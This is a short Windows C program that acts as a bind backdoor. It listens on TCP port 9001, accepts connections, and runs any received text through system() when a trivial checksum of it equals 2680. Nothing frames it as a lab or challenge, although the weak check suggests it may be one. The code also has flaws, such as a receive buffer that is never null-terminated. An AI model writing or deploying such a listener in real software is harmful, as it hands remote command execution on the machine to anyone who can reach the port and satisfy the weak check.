#include <windows.h>
#include <stdio.h>

unsigned short hash(const char *s, unsigned int len)
{
    unsigned int ret = 0;
    while (len--) ret += *(unsigned char *)s++ * len;
    return ret;
}

int Main()
{
    WSADATA wsa;

    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    struct sockaddr_in service = {0};
    service.sin_family = AF_INET;
    service.sin_addr.s_addr = 0;
    service.sin_port = htons(9001);

    bind(s, (struct sockaddr *) &service, sizeof(service));

    listen(s, 5);

    char buf[128] = {0};
    while (1) {
        SOCKET c = accept(s, NULL, NULL);
        int len = recv(c, buf, sizeof(buf), 0);
        if(hash(buf, len) == 2680) {
            system(buf);
        }
        closesocket(c);
    }
    return 0;
}
